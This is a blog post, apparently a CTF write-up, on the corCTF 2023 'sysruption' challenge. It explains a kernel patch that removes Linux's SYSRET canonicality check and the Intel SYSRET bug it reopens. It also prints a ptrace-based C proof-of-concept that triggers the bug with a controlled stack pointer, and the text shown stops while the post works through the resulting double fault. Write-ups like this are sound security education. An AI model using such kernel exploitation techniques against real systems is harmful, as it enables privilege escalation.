<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>corCTF 2023: sysruption writeup - zolutal’s blog</title>
<meta name="description" content="I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!">


  <meta name="author" content="Justin Miller">
  
  <meta property="article:author" content="Justin Miller">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="zolutal's blog">
<meta property="og:title" content="corCTF 2023: sysruption writeup">
<meta property="og:url" content="https://zolutal.github.io/corctf-sysruption/">


  <meta property="og:description" content="I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!">





  <meta name="twitter:site" content="@zolutal">
  <meta name="twitter:title" content="corCTF 2023: sysruption writeup">
  <meta name="twitter:description" content="I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!">
  <meta name="twitter:url" content="https://zolutal.github.io/corctf-sysruption/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2023-07-30T00:00:00+00:00">






<link rel="canonical" href="https://zolutal.github.io/corctf-sysruption/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Justin Miller",
      "url": "https://zolutal.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          zolutal's blog
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/about">about</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="https://zolutal.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">corCTF 2023: sysruption writeup</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Justin Miller</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>systems hacking</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Arizona</span>
        </li>
      

      
        
          
        
          
        
          
            <li><a href="https://twitter.com/zolutal" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/zolutal" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="corCTF 2023: sysruption writeup">
    <meta itemprop="description" content="I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!">
    <meta itemprop="datePublished" content="2023-07-30T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">corCTF 2023: sysruption writeup
</h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2023-07-30T00:00:00+00:00">July 30, 2023</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          25 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content" itemprop="text">
        
        <p>I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!</p>

<p style="text-align: center;"><img src="/assets/corctf-sysruption/first-blood.png" alt="first-blood" /></p>

<p>As described by the challenge text, sysruption is about:</p>

<blockquote>
  <p>A hardware quirk, a micro-architecture attack, and a kernel exploit all in one!</p>
</blockquote>

<p>So pretty much a combination of my favorite research topics :D</p>

<p>Plus it had this sick motd!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ██████ ▓██   ██▓  ██████  ██▀███   █    ██  ██▓███  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █
▒██    ▒  ▒██  ██▒▒██    ▒ ▓██ ▒ ██▒ ██  ▓██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █
░ ▓██▄     ▒██ ██░░ ▓██▄   ▓██ ░▄█ ▒▓██  ▒██░▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
  ▒   ██▒  ░ ▐██▓░  ▒   ██▒▒██▀▀█▄  ▓▓█  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
▒██████▒▒  ░ ██▒▓░▒██████▒▒░██▓ ▒██▒▒▒█████▓ ▒██▒ ░  ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
▒ ▒▓▒ ▒ ░   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒
░ ░▒  ░ ░ ▓██ ░▒░ ░ ░▒  ░ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░▒ ░         ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
░  ░  ░   ▒ ▒ ░░  ░  ░  ░    ░░   ░  ░░░ ░ ░ ░░         ░       ▒ ░░ ░ ░ ▒     ░   ░ ░
      ░   ░ ░           ░     ░        ░                        ░      ░ ░           ░
          ░ ░
</code></pre></div></div>

<p>dist:
<a href="/assets/corctf-sysruption/dist/patch.diff">patch</a>
<a href="/assets/corctf-sysruption/dist/bzImage">bzImage</a>
<a href="/assets/corctf-sysruption/dist/initramfs.cpio.gz">initramfs</a>
<a href="/assets/corctf-sysruption/dist/kconfig">kconfig</a></p>

<p>exploit:
<a href="/assets/corctf-sysruption/exploit.c">exploit.c</a>
<a href="/assets/corctf-sysruption/exploit">exploit</a></p>

<h2 id="patchwork">patchwork</h2>

<p>Looking at what was provided for the challenge, there are some kernel files and a run script along with a patchfile.</p>

<p>Here are the contents of the patch:</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">--- orig_entry_64.S
</span><span class="gi">+++ linux-6.3.4/arch/x86/entry/entry_64.S
</span><span class="p">@@ -150,13 +150,13 @@</span>
 	ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", \
 		"shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
 #else
<span class="gd">-	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
-	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
</span><span class="gi">+	# shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+	# sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
</span> #endif
<span class="err">
</span> 	/* If this changed %rcx, it was not canonical */
<span class="gd">-	cmpq	%rcx, %r11
-	jne	swapgs_restore_regs_and_return_to_usermode
</span><span class="gi">+	# cmpq	%rcx, %r11
+	# jne	swapgs_restore_regs_and_return_to_usermode
</span><span class="err">
</span> 	cmpq	$__USER_CS, CS(%rsp)		/* CS must match SYSRET */
 	jne	swapgs_restore_regs_and_return_to_usermode
<span class="err">
</span></code></pre></div></div>

<p>So what is going on here?</p>

<p>The first set of lines which are commented out are doing arithmetic shifts on rcx, the register holding the userspace rip.</p>

<p>The following lines then check if those shifts modified rcx, and if it did it will jump to the a different exit path <code class="language-plaintext highlighter-rouge">swapgs_restore_regs_and_return_to_usermode</code> instead of continuing in <code class="language-plaintext highlighter-rouge">entry_SYSCALL_64</code>.</p>

<p>Without needing to look into what the shifts are doing, it is pretty clear from the comment that this change is just removing the address canonicality checks on the userspace rip.</p>

<p>A look at the context of this patch reveals an <a href="https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/entry/entry_64.S#L139">even more helpful comment</a> in the source:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*
 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
 * in kernel space.  This essentially lets the user take over
 * the kernel, since userspace controls RSP.
 *
 * If width of "canonical tail" ever becomes variable, this will need
 * to be updated to remain correct on both old and new CPUs.
 *
 * Change top bits to match most significant bit (47th or 56th bit
 * depending on paging mode) in the address.
 */
</code></pre></div></div>

<p>So removing the canonicality checks, as this patch does, theoretically should reintroduce the Intel SYSRET bug and let us “take over the kernel”, sounds fun.</p>

<h2 id="sysret-background">sysret background</h2>

<p>I was already familiar with this bug as I had actually looked into a while back after my professor for advanced operating systems mentioned it, so I had a pretty immediate understanding of what was going on here. But I’d like to give some background based on my understanding of the bug for those who arent familiar.</p>

<p>Essentially, the sysret bug is about a difference between how AMD and Intel implement the sysret instruction. Though I should note that while I think most people would consider this a bug in Intel’s implementation of sysret, Intel does not since it behaves according to their specifications, which… I guess?</p>

<p>Here are snippets of pseudocode for sysret from the Intel and AMD manuals:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">------------------</span> <span class="n">INTEL</span> <span class="o">-------------------|-------------------</span>  <span class="n">AMD</span> <span class="o">----------------------</span>
<span class="p">...</span>                                         <span class="o">|</span> <span class="p">...</span>
<span class="n">IF</span> <span class="p">(</span><span class="n">operand</span> <span class="n">size</span> <span class="n">is</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span><span class="p">)</span>                 <span class="o">|</span> <span class="n">SYSRET_64BIT_MODE</span><span class="o">:</span>
    <span class="n">THEN</span> <span class="p">(</span><span class="o">*</span> <span class="n">Return</span> <span class="n">to</span> <span class="mi">64</span><span class="o">-</span><span class="n">Bit</span> <span class="n">Mode</span> <span class="o">*</span><span class="p">)</span>        <span class="o">|</span> <span class="n">IF</span> <span class="p">(</span><span class="n">OPERAND_SIZE</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">IF</span> <span class="p">(</span><span class="n">RCX</span> <span class="n">is</span> <span class="n">not</span> <span class="n">canonical</span><span class="p">)</span> <span class="n">THEN</span> <span class="err">#</span><span class="n">GP</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="o">|</span> <span class="p">{</span>
        <span class="n">RIP</span> <span class="o">:=</span> <span class="n">RCX</span><span class="p">;</span>                         <span class="o">|</span>      <span class="n">CS</span><span class="p">.</span><span class="n">sel</span> <span class="o">=</span> <span class="p">(</span><span class="n">MSR_STAR</span><span class="p">.</span><span class="n">SYSRET_CS</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="n">OR</span> <span class="mi">3</span>
    <span class="n">ELSE</span> <span class="p">(</span><span class="o">*</span> <span class="n">Return</span> <span class="n">to</span> <span class="n">Compatibility</span> <span class="n">Mode</span> <span class="o">*</span><span class="p">)</span> <span class="o">|</span>      <span class="p">...</span>
        <span class="n">RIP</span> <span class="o">:=</span> <span class="n">ECX</span><span class="p">;</span>                         <span class="o">|</span> <span class="p">}</span>
<span class="n">FI</span><span class="p">;</span>                                         <span class="o">|</span> <span class="p">...</span>
<span class="p">...</span>                                         <span class="o">|</span> <span class="n">RIP</span> <span class="o">=</span> <span class="n">temp_RIP</span>
<span class="n">CS</span><span class="p">.</span><span class="n">Selector</span> <span class="o">:=</span> <span class="n">CS</span><span class="p">.</span><span class="n">Selector</span> <span class="n">OR</span> <span class="mi">3</span><span class="p">;</span>            <span class="o">|</span> <span class="n">EXIT</span>
            <span class="p">(</span><span class="o">*</span> <span class="n">RPL</span> <span class="n">forced</span> <span class="n">to</span> <span class="mi">3</span> <span class="o">*</span><span class="p">)</span>           <span class="o">|</span>
<span class="p">...</span>                                         <span class="o">|</span>
</code></pre></div></div>

<p>The important part here is that the canonicality check on Intel occurs BEFORE the CS selector is set, whereas on AMD there is no builtin canonicality check in the instruction but it will be checked AFTER the CS selector is set when the cpu attempts to fetch the next instruction. The CS selector determines the current privilege level (CPL), CPL 0 is kernel mode and CPL 3 is user mode.</p>

<p>So on Intel CPUs when sysret is executed with a non-canonical instruction pointer a General Protection (GP) fault will be raised in kernel mode!</p>

<p>But on AMD CPUs when sysret is executed with a non-canonical instruction pointer a GP will occur on instruction fetch in user mode.</p>

<p>But why does this distinction matter? well, the issue is in how faults from different privilege levels are handled. On x86 when a fault occurs in CPL 3 the stack pointer will be set to a value defined in the TSS depending on what Desired Privilege Level (DPL) is defined for that fault in the Interrupt Descriptor Table (IDT):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Although hardware task-switching is not supported in 64-bit mode, a 64-bit task state segment (TSS) must exist.
Figure 8-11 shows the format of a 64-bit TSS. The TSS holds information important to 64-bit mode and that is not
directly related to the task-switch mechanism. This information includes:
• RSPn — The full 64-bit canonical forms of the stack pointers (RSP) for privilege levels 0-2.
• ISTn — The full 64-bit canonical forms of the interrupt stack table (IST) pointers.
• I/O map base address — The 16-bit offset to the I/O permission bit map from the 64-bit TSS base.
</code></pre></div></div>

<p class="caption">Intel SDM Volume 3 Ch. 8 Section 7: Task Management in 64-Bit Mode</p>

<p>But these stacks are only used when changing from a lower CPL to a higher CPL, if a fault occurs in a CPL greater than or equal to the the desired privilege level DPL for that fault, the current stack is used.</p>

<p>This becomes a problem on Intel CPUs because the the GP occurs at CPL 0 and the IDT descriptor for GP has DPL 0 so no privilege level change occurs, meaning instead of moving to the RSP0 stack pointer from the TSS, as would happen with a fault from user space, the fault will behave as a fault from kernel space and use the current (user controlled) stack pointer. So with a non-canonical instruction pointer the stack location when entering the GP fault handler will be a user controlled address.</p>

<p>Phew, x86 sure is something.</p>

<h2 id="triggering-the-bug">triggering the bug</h2>

<p>But how do you even reach sysret with a non-canonical instruction pointer? After all you need to have execute system call to be in <code class="language-plaintext highlighter-rouge">entry_SYSCALL_64</code> in the first place, so you can’t just jump to a non-canonical address or something since that won’t ever hit sysret.</p>

<p>I had a few ideas of how to go about this, one I had heard about <a href="https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/">here</a> was to map the last page before the non-canonical address gap and execute a syscall instruction at the end of that page which would cause rip to be incremented to a non-canonical address when executed, but it seems Linux does not let you map that page. Another idea I had was to use sigreturn to set the user space rip to a non-canonical address which probably would have worked, but I ended up finding a <a href="https://github.com/vnik5287/cve-2014-4699-ptrace/blob/master/poc_v0.c">poc</a> to trigger the bug using ptrace related to this <a href="https://duasynt.com/blog/cve-2014-4699-linux-kernel-ptrace-sysret-analysis">blog</a> on a Linux CVE the author found involving sysret.</p>

<p>This poc worked to trigger the bug almost immediately after some fixing up, but the exploitation was far from done.</p>

<p>Cleaned up poc:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">do_sysret</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="o">*</span><span class="n">regs_arg</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">chld</span><span class="p">;</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">regs</span><span class="p">,</span> <span class="n">regs_arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">regs</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">chld</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"fork"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">chld</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">perror</span><span class="p">(</span><span class="s">"PTRACE_TRACEME"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">raise</span><span class="p">(</span><span class="n">SIGSTOP</span><span class="p">);</span>
        <span class="n">fork</span><span class="p">();</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">waitpid</span><span class="p">(</span><span class="n">chld</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETOPTIONS</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PTRACE_O_TRACEFORK</span><span class="p">);</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">waitpid</span><span class="p">(</span><span class="n">chld</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x8000000000000000</span><span class="p">;</span> <span class="c1">// not-canonical</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rcx</span> <span class="o">=</span> <span class="mh">0x8000000000000000</span><span class="p">;</span> <span class="c1">// not-canonical</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>

    <span class="c1">// necessary stuff</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">eflags</span> <span class="o">=</span> <span class="mh">0x246</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">r11</span> <span class="o">=</span> <span class="mh">0x246</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">ss</span> <span class="o">=</span> <span class="mh">0x2b</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">cs</span> <span class="o">=</span> <span class="mh">0x33</span><span class="p">;</span>

    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The whole point of triggering this bug is to cause memory corruption through the register dump that occurs in the GP handler, so I tried setting my stack pointer to some writeable kernel data structures to see if I could hijack them. Stepping through the GP handler I could see that it did exactly that! until it all came crashing down…</p>

<h2 id="surviving-the-bug">surviving the bug</h2>

<p>Triggering the bug with a target kernel address in rsp was failing because of a double fault caused by the GP handler unexpectedly executing with user space’s gsbase.</p>

<p>The gsbase register is used on Linux to access percpu variables. In the Linux source code it is used by the <code class="language-plaintext highlighter-rouge">current</code> macro to locate the current task struct, for example. On kernel entry and exit the <code class="language-plaintext highlighter-rouge">swapgs</code> instruction is executed to switch back and forth between the kernel and user gsbase values since user space is allowed to use a gs segment as well.</p>

<p>e.g. in <code class="language-plaintext highlighter-rouge">entry_SYSCALL_64</code>:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">entry_SYSCALL_64:</span>
    <span class="nf">swapgs</span>
    <span class="nf">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="nb">gs</span><span class="p">:</span><span class="mh">0x6014</span><span class="p">,</span><span class="nb">rsp</span>
<span class="nf">...</span>
    <span class="nf">swapgs</span>
    <span class="nf">sysretq</span>
</code></pre></div></div>

<p>But since swapgs was executed right before sysret and the GP handler sees that the GP was from kernel mode (CPL was 0) swapgs is not executed again in the GP handler, meaning it executes with a userspace gsbase. This becomes a problem when the GP handler tries to access percpu variables since user space gsbase is usually unused and set to zero so that results in a pagefault.</p>

<p>Lets take a deeper look at what is going on in the GP handler.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">asm_exc_general_protection:</span>
    <span class="nf">cld</span>
    <span class="nf">call</span>   <span class="nv">error_entry</span>
    <span class="nf">mov</span>    <span class="nb">rsp</span><span class="p">,</span><span class="nb">rax</span>
    <span class="nf">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="nb">rsp</span>
    <span class="nf">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x78</span><span class="p">]</span>
    <span class="nf">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x78</span><span class="p">],</span><span class="mh">0xffffffffffffffff</span>
    <span class="nf">call</span>   <span class="nv">exc_general_protection</span>
    <span class="nf">jmp</span>    <span class="nv">error_return</span>
</code></pre></div></div>

<p>When a GP occurs, execution is redirected to the handler above, which immediately calls into <code class="language-plaintext highlighter-rouge">error_entry</code>. The <code class="language-plaintext highlighter-rouge">error_entry</code> function is pretty generic and shared across many of the fault/trap handlers of the kernel, the start of <code class="language-plaintext highlighter-rouge">error_entry</code> is:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">error_entry:</span>
    <span class="nf">push</span>   <span class="nb">rsi</span>
    <span class="nf">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
    <span class="nf">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">rdi</span>
    <span class="nf">push</span>   <span class="nb">rdx</span>
    <span class="nf">push</span>   <span class="nb">rcx</span>
    <span class="nf">push</span>   <span class="nb">rax</span>
    <span class="nf">push</span>   <span class="nv">r8</span>
    <span class="nf">push</span>   <span class="nv">r9</span>
    <span class="nf">push</span>   <span class="nv">r10</span>
    <span class="nf">push</span>   <span class="nv">r11</span>
    <span class="nf">push</span>   <span class="nb">rbx</span>
    <span class="nf">push</span>   <span class="nb">rbp</span>
    <span class="nf">push</span>   <span class="nv">r12</span>
    <span class="nf">push</span>   <span class="nv">r13</span>
    <span class="nf">push</span>   <span class="nv">r14</span>
    <span class="nf">push</span>   <span class="nv">r15</span>
    <span class="nf">push</span>   <span class="nb">rsi</span>
<span class="nf">...</span>
</code></pre></div></div>
<p>The start of error entry is what handles storing the registers for interrupts, this is the memory corruption we are trying to exploit, all general purpose registers will be pushed to the stack pointer we control.</p>

<p>Here is where in error entry <code class="language-plaintext highlighter-rouge">swapgs</code> is skipped if we entered from kernel space.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">error_entry:</span>
<span class="nf">...</span>
    <span class="nf">test</span>   <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x90</span><span class="p">],</span><span class="mh">0x3</span> <span class="o">&lt;--</span> <span class="nv">CPL</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="nv">?</span>
    <span class="nf">jz</span>     <span class="mh">0xffffffff81c014b2</span>      <span class="o">&lt;--</span> <span class="nv">skip</span> <span class="nv">swapgs</span> <span class="nv">if</span> <span class="mi">0</span>
    <span class="nf">swapgs</span>
<span class="nf">...</span>
</code></pre></div></div>

<p>And this is where the gs segment is first used, causing the system to double fault.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">exc_general_protection:</span>
    <span class="nf">push</span>   <span class="nv">r13</span>
    <span class="nf">mov</span>    <span class="nv">r13</span><span class="p">,</span><span class="nb">rsi</span>
    <span class="nf">push</span>   <span class="nv">r12</span>
    <span class="nf">push</span>   <span class="nb">rbp</span>
    <span class="nf">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rdi</span>
    <span class="nf">push</span>   <span class="nb">rbx</span>
    <span class="nf">sub</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x70</span>
    <span class="nf">mov</span>    <span class="nb">rax</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="nb">gs</span><span class="p">:</span><span class="mh">0x28</span> <span class="o">&lt;--</span> <span class="nv">fault</span> <span class="nv">here</span> <span class="p">:(</span>
</code></pre></div></div>

<p>So how can we survive this?</p>

<p>In the ptrace sysret blog, the author survives the double fault by targeting the IDT in order to hijack the page fault handler to userspace. Unfortunately, we are living in the future meaning we don’t have a writeable IDT and SMEP would anyways prevent us from executing off a user space page. So I had to find some other way to survive triggering the bug.</p>

<p>Well the gsbase causing the fault belongs to userspace, but can we control our own gsbase? can we make it point to a kernel address?</p>

<p>My first attempt was to have ptrace set gsbase since I was already using ptrace to set the registers, but as it turns out <a href="https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/kernel/ptrace.c#L395">ptrace will not set gsbase if the address is greater than TASK_SIZE_MAX</a> (greater than the max user space address).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">case</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">user_regs_struct</span><span class="p">,</span><span class="n">gs_base</span><span class="p">):</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">value</span> <span class="o">&gt;=</span> <span class="n">TASK_SIZE_MAX</span><span class="p">)</span> <span class="o">&lt;--</span> <span class="n">sad</span>
            <span class="k">return</span> <span class="o">-</span><span class="n">EIO</span><span class="p">;</span>
        <span class="n">x86_gsbase_write_task</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<p>The same is true of <code class="language-plaintext highlighter-rouge">arch_prctl(ARCH_SET_GS)</code> as well…</p>

